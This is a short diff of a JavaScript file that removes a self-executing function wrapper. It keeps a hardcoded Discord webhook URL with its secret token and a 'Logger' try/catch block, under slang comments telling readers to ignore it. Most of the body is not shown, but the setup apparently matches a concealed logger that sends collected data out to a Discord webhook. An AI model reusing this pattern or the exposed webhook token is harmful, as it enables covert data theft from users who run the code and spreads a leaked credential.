@@ -1,6 +1,6 @@
 // ignore this fr this for bngg btw
 console.log("suppress got a fatty but no one know 'bout that fr")
-(function () {
+
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1458253639239077949/DzCKmehtJ2eiaZk4PFjmtvNez_o8fMGZLO1rbvf0Z574DzyykZLjwemRzEZDgJLKEGEc";
 
     try {
@@ -57,5 +57,4 @@ console.log("suppress got a fatty but no one know 'bout that fr")
     } catch (e) {
         console.error("Logger error:", e);
     }
-})();
 
